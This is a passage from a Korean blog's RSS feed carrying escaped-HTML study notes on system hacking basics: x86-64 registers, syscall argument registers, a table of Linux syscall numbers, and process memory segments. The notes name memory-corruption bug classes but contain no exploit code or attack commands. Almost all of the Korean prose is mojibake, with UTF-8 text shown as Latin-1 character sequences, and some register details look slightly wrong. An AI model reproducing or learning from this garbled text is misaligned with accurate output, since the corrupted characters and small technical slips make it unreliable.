ê¶Œí•œì„ ë¶„ë¦¬í•œë‹¤)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;writeë¥¼ í•˜ê¸° ìœ„í•´ì„œëŠ” â€˜ì–´ë””ì—â€™ â€˜ë¬´ì—‡ì„â€™ â€˜ì–¼ë§ˆë§Œí¼ì˜ ê¸¸ì´ë¡œâ€™ ì“¸ ê²ƒì¸ì§€ë¥¼ ì•Œë ¤ ì¤˜ì•¼ í•œë‹¤.&lt;/strong&gt; ê·¸ë¦¬ê³  OSëŠ” ì •í™•í•˜ê²Œ ì´ ì„¸ ê°€ì§€ ìš”ê±´ì„ ì…ë ¥ë°›ì•„ write ì—°ì‚°ì— ì‚¬ìš©í•œë‹¤. ê° ì •ë³´ëŠ” rdi, rsi, rdxì— ì €ì¥ëœë‹¤. ë ˆì§€ìŠ¤í„°ì˜ ìš©ë„ë¥¼ ê³ ë ¤í•´ ë³´ë©´ ì¼ë¦¬ê°€ ìˆê²Œ ì €ì¥ë˜ëŠ” ì…ˆì´ë‹¤.&lt;/p&gt;

&lt;p&gt;rdiëŠ” destination, ì¦‰ ì •ë³´ê°€ ì–´ë””ë¡œ í–¥í• ì§€ë¥¼ ì €ì¥í•˜ëŠ” ë° ì“°ì´ê³ , rsiëŠ” source, ì¦‰ ì •ë³´ì˜ ì¶œì²˜ê°€ ì–´ë””ì¸ì§€ ì§€ì •í•˜ëŠ” ë° ì“°ì´ë¯€ë¡œ ê°ê° â€˜ì–´ë””ì—â€™ì™€ â€˜ë¬´ì—‡ì„â€™ ì„ ì €ì¥í•˜ëŠ” ë° ì í•©í•œ ë…¼ë¦¬ë¥¼ ê°€ì§€ê³  ìˆê¸° ë•Œë¬¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ â€˜ì–¼ë§ˆë§Œí¼ì˜ ê¸¸ì´ë¡œâ€™ë¥¼ ì €ì¥í•˜ëŠ” rdxëŠ”? ì´ê±´ ì‚¬ì‹¤ ì¼ë°˜ì ì¸ convention ë•Œë¬¸ì— ì“°ì¸ë‹¤. ê·¸ conventionì´ë€ ë¬´ì—‡ì´ëƒë©´â€¦&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;rdi&lt;/td&gt;
      &lt;td&gt;ì²« ë²ˆì§¸ ì¸ì ì €ì¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rsi&lt;/td&gt;
      &lt;td&gt;ë‘ë²ˆì§¸ ì¸ì ì €ì¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rdx&lt;/td&gt;
      &lt;td&gt;ì„¸ë²ˆì§¸ ì¸ì ì €ì¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rcx&lt;/td&gt;
      &lt;td&gt;ë„¤ë²ˆì§¸ ì¸ì ì €ì¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;r8&lt;/td&gt;
      &lt;td&gt;ë‹¤ì„¯ë²ˆì§¸ ì¸ì ì €ì¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;r9&lt;/td&gt;
      &lt;td&gt;ì—¬ì„¯ë²ˆì§¸ ì¸ì ì €ì¥&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ë°”ë¡œ ìœ„ì˜ í…Œì´ë¸”ì´ë‹¤. ì¼ë°˜ì ìœ¼ë¡œ í•¨ìˆ˜ì˜ íŒŒë¼ë¯¸í„°ë¥¼ ì „ë‹¬í•  ë•Œ ë ˆì§€ìŠ¤í„°ëŠ” ìœ„ì™€ ê°™ì€ ìˆœì„œë¡œ ì¸ìë¥¼ ì €ì¥í•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;ê·¸ëŸ°ë° ì¢€ ì´ìƒí•˜ë„¤â€¦ ì§€ê¸ˆ ì´ê±¸ ì“°ë©´ì„œ ìƒê¸´ ì˜ë¬¸ì¸ë°, ì´ëŸ° conventionì€ system callì— ì¸ìë¥¼ ì „ë‹¬í•˜ë©´ì„œ ìƒê²¨ë‚˜ì„œ ìœ ì € ê¶Œí•œì˜ í•¨ìˆ˜ë¥¼ ì½œí•  ë•Œë„ ì“°ê²Œ ëœ ê±° ì•„ë‹Œê°€? ê·¸ëŸ¼ system callì— rdxë¥¼ ì„¸ë²ˆì§¸ ì¸ìë¥¼ ì „ë‹¬í•  ë•Œ ì“°ëŠ” ì´ìœ ëŠ” ëŒ€ì²´ ì™œì§€? ì–¸ì  ê°€ ì•Œê²Œ ë˜ê² ì§€â€¦ ì§€ê¸ˆì€ ì´ê²Œ í•µì‹¬ì´ ì•„ë‹ˆë‹ˆê¹Œ ë„˜ì–´ê°€ì.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;ì •ë¦¬í•´ ë³´ì. ë§Œì¼ ì½˜ì†”ì— ë©”ëª¨ë¦¬ ìƒì˜ ì–´ë–¤ ì •ë³´ë¥¼ ì½ì–´ì™€ writeí•œë‹¤ê³  ì¹˜ë©´&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; ëª…ë ¹ì–´ê°€ ì‹¤í–‰ëœë‹¤. ì´ë ‡ê²Œ syscall ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ë©´ &lt;strong&gt;CPUëŠ” raxë¶€í„° ì³ë‹¤ë³´ê²Œ ëœë‹¤.&lt;/strong&gt; &lt;del&gt;(ì–¸ë‹ˆ ë­ë¶€í„° í• ê¹Œìš”)&lt;/del&gt; ê·¸ë ‡ê²Œ ì–´ë–¤ ì‹œìŠ¤í…œ ì½œì„ ì‹¤í–‰í• ì§€ ê²°ì •í•˜ë©´ CPUëŠ” í•´ë‹¹ ì‹œìŠ¤í…œ ì½œì— ì‚¬ìš©í•  ì¸ìë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ ì•„ë˜ì˜ ìˆœì„œë¡œ ë ˆì§€ìŠ¤í„°ë¥¼ ì°¸ì¡°í•œë‹¤.(ìœ ì € ê¶Œí•œì—ì„œ ì‹œìŠ¤í…œ ì½œì„ ìš”ì²­í•  ë•ŒëŠ” ì•„ë˜ì˜ sequenceë¡œ ì§„í–‰ë˜ê³ , ì»¤ë„ ê¶Œí•œì˜ ì¸í„°í˜ì´ìŠ¤ì—ì„œ ë­”ê°€ë¥¼ í•  ë• ë˜ ë‹¤ë¥¸ sequenceë¡œ ë ˆì§€ìŠ¤í„°ë¥¼ ì½ëŠ”ë‹¤)&lt;/p&gt;

&lt;aside&gt;
âš™ **rdi â†’ rsi â†’ rdx â†’ rcx â†’ r8 â†’ r9 â†’ stack**

&lt;/aside&gt;

&lt;p&gt;raxì—ì„œ write system callì„ ê°€ë¦¬í‚¤ê³  ìˆê¸° ë•Œë¬¸ì—, ì´ì œ ì»¤ë„ì€ write(out_mode, data_add, length)ë¥¼ ìˆ˜í–‰í•˜ê²Œ ëœë‹¤. ì¸ìê°€ 3ê°œì´ë¯€ë¡œ ì»¤ë„ì´ ì°¸ì¡°í•˜ëŠ” ë ˆì§€ìŠ¤í„°ëŠ” rdi, rsi, rdxê°€ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì°¸ê³ ë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; ì´ ë¦¬í„´ë˜ë©´ ë ˆì§€ìŠ¤í„° ì»¨ë²¤ì…˜ì— ë”°ë¼ raxì— ì‹œìŠ¤í…œ ì½œì˜ ê²°ê³¼ê°€ ì €ì¥ëœë‹¤. ì—ëŸ¬ ë²ˆí˜¸ë¼ë“ ê°€ ì„±ê³µ ì—¬ë¶€ë¼ë“ ê°€â€¦&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ë¶€ë¡: System call table ì¤‘ ì£¼ìš” ëª‡ ê°€ì§€ ì‹œìŠ¤í…œ ì½œ(ê²€ìƒ‰í•˜ë©´ ë‚˜ì˜´)&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0Â (rdi)&lt;/th&gt;
          &lt;th&gt;arg1Â (rsi)&lt;/th&gt;
          &lt;th&gt;arg2Â (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;read&lt;/td&gt;
          &lt;td&gt;0x00&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;write&lt;/td&gt;
          &lt;td&gt;0x01&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;const char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;open&lt;/td&gt;
          &lt;td&gt;0x02&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;int flags&lt;/td&gt;
          &lt;td&gt;umode_t mode&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;close&lt;/td&gt;
          &lt;td&gt;0x03&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;Â &lt;/td&gt;
          &lt;td&gt;Â &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;mprotect&lt;/td&gt;
          &lt;td&gt;0x0a&lt;/td&gt;
          &lt;td&gt;unsigned long start&lt;/td&gt;
          &lt;td&gt;size_t len&lt;/td&gt;
          &lt;td&gt;unsigned long prot&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;connect&lt;/td&gt;
          &lt;td&gt;0x2a&lt;/td&gt;
          &lt;td&gt;int sockfd&lt;/td&gt;
          &lt;td&gt;struct sockaddr * addr&lt;/td&gt;
          &lt;td&gt;int addrlen&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;execve&lt;/td&gt;
          &lt;td&gt;0x3b&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;const char *const *argv&lt;/td&gt;
          &lt;td&gt;const char *const *envp&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 28 Jun 2022 18:25:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step2-2/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step2-2/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 2</title>
        <description>&lt;h1 id=&quot;stage-2&quot;&gt;STAGE 2&lt;/h1&gt;

&lt;h1 id=&quot;background-computer-architecture&quot;&gt;Background: Computer Architecture&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Instruction Set Architecture: CPUê°€ ì‚¬ìš©í•˜ëŠ” ëª…ë ¹ì–´ì™€ ê´€ë ¨ëœ ì„¤ê³„. CPUê°€ í•´ì„í•˜ëŠ” ëª…ë ¹ì–´ì˜ ì§‘í•©.
    &lt;ul&gt;
      &lt;li&gt;ê°€ì¥ ë„ë¦¬ ì‚¬ìš©ë˜ëŠ” ISA: Intel x86-64, ARM&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;x86-64-architectureamd64-architecture&quot;&gt;X86-64 Architecture=AMD64 Architecture&lt;/h2&gt;

&lt;h3 id=&quot;x64-ì•„í‚¤í…ì³ì˜-ë ˆì§€ìŠ¤í„°&quot;&gt;x64 ì•„í‚¤í…ì³ì˜ ë ˆì§€ìŠ¤í„°&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;General Register
    &lt;ul&gt;
      &lt;li&gt;ì£¼ìš©ë„ëŠ” ìˆì§€ë§Œ, ê·¸ ì™¸ì˜ ë‹¤ì–‘í•œ ìš©ë„ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆëŠ” ë ˆì§€ìŠ¤í„°.
        &lt;ul&gt;
          &lt;li&gt;32ë¹„íŠ¸ ì•„í‚¤í…ì³ CPUê°€ ì œê³µí•  ìˆ˜ ìˆëŠ” ê°€ìƒë©”ëª¨ë¦¬ì˜ í¬ê¸°: 4GB&lt;/li&gt;
          &lt;li&gt;64ë¹„íŠ¸ ì•„í‚¤í…ì³ CPUê°€ ì œê³µí•  ìˆ˜ ìˆëŠ” ê°€ìƒë©”ëª¨ë¦¬ì˜ í¬ê¸°: 16EB(ì—‘ì‚¬ë°”ì´íŠ¸)-ì–´ë§ˆì–´ë§ˆí•˜ê²Œ í° ê³µê°„ìœ¼ë¡œ, í”„ë¡œì„¸ìŠ¤ì˜ ì„±ëŠ¥ì— ì œí•œì„ ê±¸ ì¼ì´ ì—†ë‹¤.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;x64ì˜ ê²½ìš° ê° ë²”ìš© ë ˆì§€ìŠ¤í„°ì—ëŠ” 8ë°”ì´íŠ¸ ì €ì¥&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì´ë¦„ì´ rë¡œ ì‹œì‘í•¨-64ë¹„íŠ¸ ì•„í‚¤í…ì³. 32ë¹„íŠ¸ ì•„í‚¤í…ì³ëŠ” eë¡œ ì‹œì‘í•¨.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;x64ì˜ general registerì¤‘ ì£¼ìš©ë„ê°€ ì •í•´ì§„ ë ˆì§€ìŠ¤í„°ë“¤.&lt;/p&gt;

        &lt;p&gt;â†’ ebxëŠ” rbxì™€ëŠ” ë‹¤ë¥´ê²Œ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ì €ì¥í•˜ê¸° ìœ„í•œ ìš©ë„ë¡œ ì‚¬ìš©ëì—ˆìŒ.&lt;/p&gt;

        &lt;p&gt;â†’ edxëŠ” rdxì™€ëŠ” ë‹¤ë¥´ê²Œ ë¶€í˜¸ ê´€ë ¨í•œ ëª…ë ¹ì„ ì €ì¥í•˜ê¸° ìœ„í•œ ìš©ë„ë¡œ ì‚¬ìš©ëì—ˆìŒ.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Segment Register
    &lt;ul&gt;
      &lt;li&gt;6ê°œ ì¢…ë¥˜: cs, ss, ds, es, fs, gs&lt;/li&gt;
      &lt;li&gt;64ë¹„íŠ¸ë¡œ ì•„í‚¤í…ì²˜ í™•ì¥ë˜ë©´ì„œ ìš©ë„ì— í° ë³€í™”ê°€ ìƒê¹€.
        &lt;ul&gt;
          &lt;li&gt;32ë¹„íŠ¸ ì‹œì ˆâ€¦ general register í¬ê¸°ê°€ ì‘ìœ¼ë‹ˆ ì‚¬ìš© ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œ í­ë„ ì¢ì•˜ìŒ.&lt;/li&gt;
          &lt;li&gt;ë”°ë¼ì„œ ì˜¤í”„ì…‹ì— í•„ìš”í•œ ì„¸ê·¸ë¨¼íŠ¸ ì£¼ì†Œë¥¼ ì €ì¥í•´ ì£¼ê¸° ìœ„í•´ ì‚¬ìš©ëì—ˆìŒ.=ì‚¬ìš© ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œ í­ì„ ëŠ˜ë ¤ ì¤¬ìŒ.
            &lt;ul&gt;
              &lt;li&gt;ì‹¤ì œ ì£¼ì†Œ = ì˜¤í”„ì…‹ ì£¼ì†Œ + ì„¸ê·¸ë¨¼íŠ¸ ì£¼ì†Œ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;ê·¸ëŸ°ë° 64ë¹„íŠ¸ êµ¬ì¡°ê°€ ë˜ë©´ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œ í­ì´ ë§¤ìš° ë„“ì–´ì§.&lt;/li&gt;
          &lt;li&gt;ë”°ë¼ì„œ, ì´ì   ì£¼ì†Œë¥¼ ê°„ì ‘ì ìœ¼ë¡œ í‘œí˜„í•´ ì£¼ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ” ì¼ì´ ì—†ì–´ì§.&lt;/li&gt;
          &lt;li&gt;x64ì—ì„œ cs, ds, ssëŠ” ì½”ë“œ ì˜ì—­, ë°ì´í„°, ìŠ¤íƒ ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê°€ë¦¬í‚¬ ë•Œ ì‚¬ìš©ë¨.&lt;/li&gt;
          &lt;li&gt;ë‚˜ë¨¸ì§€ ë ˆì§€ìŠ¤í„°ëŠ” ìš´ì˜ì²´ì œ ë³„ë¡œ ìš©ë„ë¥¼ ê²°ì •í•  ìˆ˜ ìˆë„ë¡ ë²”ìš©ì ìœ¼ë¡œ ì œì‘ë˜ì—ˆìŒ.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Instruction Pointer Register
    &lt;ul&gt;
      &lt;li&gt;ë‹¤ìŒì— ì‹¤í–‰í•  instruction ê°€ë¦¬í‚¤ê¸°.&lt;/li&gt;
      &lt;li&gt;x64: rip(8 byte), x86-64: eip(4 byte)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Flag Register
    &lt;ul&gt;
      &lt;li&gt;í”„ë¡œì„¸ì„œì˜ í˜„ì¬ ìƒíƒœë¥¼ ì €ì¥í•˜ê³  ìˆëŠ” ë ˆì§€ìŠ¤í„°.&lt;/li&gt;
      &lt;li&gt;x86: 16 bit â†’ x64: 64 bit, â€œRFLAGSâ€&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;RFLAGSëŠ” 64ê°œì˜ í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ, ì‹¤ì§ˆì ìœ¼ë¡œëŠ” ì˜¤ë¥¸ìª½ 20ê°œ ì •ë„ ë¹„íŠ¸ë§Œ ì‚¬ìš©.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2_1.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;ì‹œìŠ¤í…œ í•´í‚¹ì„ í•  ë•Œ ì£¼ë¡œ ì ‘í•  í”Œë˜ê·¸&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ë ˆì§€ìŠ¤í„°-í˜¸í™˜&quot;&gt;ë ˆì§€ìŠ¤í„° í˜¸í™˜&lt;/h3&gt;

&lt;p&gt;16ë¹„íŠ¸ ì•„í‚¤í…ì²˜: ì•ì— ì•„ë¬´ê²ƒë„ ì•ˆ ë¶™ìŒ&lt;/p&gt;

&lt;p&gt;32ë¹„íŠ¸ ì•„í‚¤í…ì²˜: ì•ì— e ë¶™ìŒ&lt;/p&gt;

&lt;p&gt;64ë¹„íŠ¸ ì•„í‚¤í…ì²˜: ì•ì— r ë¶™ìŒ&lt;/p&gt;

&lt;p&gt;ì˜ˆì‹œ: ax(eaxì˜ í•˜ìœ„ 16ë¹„íŠ¸) &amp;lt; eax(raxì˜ í•˜ìœ„ 32ë¹„íŠ¸) &amp;lt; rax&lt;/p&gt;

&lt;p&gt;ê·¸ ì™€ì¤‘ì— 16ë¹„íŠ¸ ì•„í‚¤í…ì²˜ì˜ ë ˆì§€ìŠ¤í„°ëŠ” eaxì˜ ìƒìœ„ 8ë¹„íŠ¸, í•˜ìœ„ 8ë¹„íŠ¸ë¥¼ ì°¨ì§€í•˜ëŠ” ê²ƒë„ ìˆìŒ. (AX, BX, CX, DX ê³„ì—´ ì¤‘ ëì´ Hë©´ Highë¡œ ìƒìœ„ 8ë¹„íŠ¸, Lë©´ Lowë¡œ í•˜ìœ„ 8ë¹„íŠ¸)&lt;/p&gt;

&lt;h1 id=&quot;background-linux-memory-layout&quot;&gt;Background: Linux Memory Layout&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Memory Corruption: ê³µê²©ìê°€ ì•…ì˜ì ìœ¼ë¡œ ì¡°ì‘í•œ ë©”ëª¨ë¦¬ ê°’ì— ì˜í•´ CPUê°€ ì˜ëª»ëœ ë™ì‘ì„ í•˜ê²Œ ë˜ëŠ” ê³µê²©. ì‹œìŠ¤í…œ í•´í‚¹ì˜ ê³µê²© ê¸°ë²•ì˜ ê¸°ë³¸ì´ ë˜ëŠ” ê¸°ë²•.&lt;/li&gt;
  &lt;li&gt;Memory Corruptionì„ ì´ìš©í•œ ì·¨ì•½ì ì˜ ì¢…ë¥˜:
    &lt;ul&gt;
      &lt;li&gt;Stack Buffer Overflow&lt;/li&gt;
      &lt;li&gt;Off by One&lt;/li&gt;
      &lt;li&gt;Format String Bug&lt;/li&gt;
      &lt;li&gt;Double Free Bug&lt;/li&gt;
      &lt;li&gt;Use After Free&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;ë¦¬ëˆ…ìŠ¤-í”„ë¡œì„¸ìŠ¤ì˜-ë©”ëª¨ë¦¬-êµ¬ì¡°&quot;&gt;ë¦¬ëˆ…ìŠ¤ í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ êµ¬ì¡°&lt;/h2&gt;

&lt;h3 id=&quot;5ê°œ-segment&quot;&gt;â€œ5ê°œ Segmentâ€&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ì ì¬ë˜ëŠ” ë°ì´í„° ìš©ë„ë³„ë¡œ ë©”ëª¨ë¦¬ì˜ êµ¬íšì„ ë‚˜ëˆˆ ê²ƒ.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;ë¦¬ëˆ…ìŠ¤ì—ì„œ í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ë¥¼ êµ¬ë¶„í•˜ëŠ” ë°©ì‹.&lt;/li&gt;
    &lt;li&gt;1) ì½”ë“œ ì„¸ê·¸ë¨¼íŠ¸, 2) ë°ì´í„° ì„¸ê·¸ë¨¼íŠ¸, 3) BSS ì„¸ê·¸ë¨¼íŠ¸, 4) í™ ì„¸ê·¸ë¨¼íŠ¸, 5) ìŠ¤íƒ ì„¸ê·¸ë¨¼íŠ¸&lt;/li&gt;
    &lt;li&gt;êµ¬íšë³„ë¡œ ê¶Œí•œì´ ë‹¤ë¥´ê³ , CPUëŠ” í•´ë‹¹ êµ¬ì—­ì— ë¶€ì—¬ëœ ê¶Œí•œì— ë§ëŠ” í–‰ìœ„ë§Œ í•  ìˆ˜ ìˆìŒ.
      &lt;ul&gt;
        &lt;li&gt;READ&lt;/li&gt;
        &lt;li&gt;WRITE&lt;/li&gt;
        &lt;li&gt;EXECUTE&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;ë” ìì„¸íˆ ì•Œê³  ì‹¶ë‹¤ë©´, ì„¸ê·¸ë¨¼í…Œì´ì…˜ ê¸°ë²• &amp;amp;&amp;amp; x86-64 í•˜ë“œì›¨ì–´ ì„¤ê³„ ì°¸ê³ .&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2_2.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìš°ì™€~ ë¦¬ëˆ…ìŠ¤ì—ì„œëŠ” ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ê°€ 5ê°œì˜ ì˜ì—­ìœ¼ë¡œ êµ¬ë¶„ë˜ê³ , ê° ì˜ì—­ë³„ë¡œ CPUê°€ ë¶€ì—¬ë°›ì€ ê¶Œí•œì´ ë‹¤ë¥´êµ¬ë‚˜!&lt;/p&gt;

&lt;h3 id=&quot;code-segment&quot;&gt;â€œCode Segmentâ€&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ì‹¤í–‰ ê°€ëŠ¥í•œ ê¸°ê³„ ì½”ë“œê°€ ìœ„ì¹˜í•˜ëŠ” ì˜ì—­&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ &amp;amp; EXECUTE: CPUê°€ ì½”ë“œë¥¼ â€œì½ì–´ì„œâ€ â€œì‹¤í–‰â€í•´ì•¼ í•˜ë¯€ë¡œ.&lt;/li&gt;
    &lt;li&gt;WRITE ê¶Œí•œì´ ì ˆëŒ€ ìˆìœ¼ë©´ ì•ˆë˜ëŠ” ì˜ì—­: ì•…ì˜ì ì¸ ì½”ë“œë¥¼ â€œì“°ë©´â€ ì•ˆ ë˜ë‹ˆê¹Œ.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;data-segment&quot;&gt;â€œData Segmentâ€&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ì»´íŒŒì¼ ì‹œì ì— ê°’ì´ ì •í•´ì§„ ì „ì—­ ë³€ìˆ˜ &amp;amp; ì „ì—­ ìƒìˆ˜ê°€ ìœ„ì¹˜í•˜ëŠ” ì˜ì—­.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Initialized Global&lt;/li&gt;
    &lt;li&gt;READ + (ìƒí™©ì— ë”°ë¼ WRITE)&lt;/li&gt;
    &lt;li&gt;ë°ì´í„° ì„¸ê·¸ë¨¼íŠ¸ì—ëŠ” ë‘ ì¢…ë¥˜ê°€ ìˆìŒ.
      &lt;ul&gt;
        &lt;li&gt;Data Segment
          &lt;ul&gt;
            &lt;li&gt;WRITABLE: í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ë©´ì„œ ê°’ì´ ë³€í•  ìˆ˜ ìˆëŠ” ë°ì´í„°ë“¤. ì˜ˆ) ê¸€ë¡œë²Œ â€œë³€ìˆ˜â€ ë“±â€¦&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
        &lt;li&gt;ROData Segment: Read-Only
          &lt;ul&gt;
            &lt;li&gt;Non-WRITABLE: í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ë©´ì„œ ê°’ì´ ë³€í•˜ë©´ ì•ˆ ë˜ëŠ” ë°ì´í„°ë“¤. ì˜ˆ) ê¸€ë¡œë²Œ â€œìƒìˆ˜â€&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;bss-segment&quot;&gt;â€œBSS Segmentâ€&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ì»´íŒŒì¼ ì‹œì ì— ê°’ì´ ì •í•´ì§€ì§€ ì•Šì€ ì „ì—­ ë³€ìˆ˜ê°€ ìœ„ì¹˜í•˜ëŠ” ì˜ì—­.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Block Started by Symbol Segment&lt;/li&gt;
    &lt;li&gt;Not Initialized Global; ì„ ì–¸ë§Œ í•˜ê³  ì´ˆê¸°í™”ëŠ” ì•ˆí•œ ì „ì—­ ë³€ìˆ˜ë“¤&lt;/li&gt;
    &lt;li&gt;í”„ë¡œê·¸ë¨ ì‹œì‘ ì‹œ ëª¨ë‘ 0ìœ¼ë¡œ ê°’ì´ ì´ˆê¸°í™”ë¨.&lt;/li&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;stack-segment&quot;&gt;â€œStack Segmentâ€&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;í”„ë¡œì„¸ìŠ¤ì˜ ìŠ¤íƒì´ ìœ„ì¹˜í•˜ëŠ” ì˜ì—­. í•¨ìˆ˜ì˜ ì¸ì, ì§€ì—­ ë³€ìˆ˜ ë“±ì˜ ì„ì‹œ ë³€ìˆ˜ë“¤ì´ â€˜í”„ë¡œì„¸ìŠ¤ ì‹¤í–‰ ì¤‘â€™ì— ì €ì¥ë˜ëŠ” ê³µê°„.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;READ + WRITE&lt;/li&gt;
    &lt;li&gt;â€œìŠ¤íƒ í”„ë ˆì„(Stack Frame)â€ì´ë¼ëŠ” ë‹¨ìœ„ë¡œ ì‚¬ìš©ë¨.
      &lt;ul&gt;
        &lt;li&gt;í•¨ìˆ˜ê°€ í˜¸ì¶œë  ë•Œ ìƒì„±ë˜ê³ , ë°˜í™˜ë  ë•Œ í•´ì œë¨(ìš°ë¦¬ê°€ ìµíˆ ì•„ëŠ” ê·¸ê²ƒ)&lt;/li&gt;
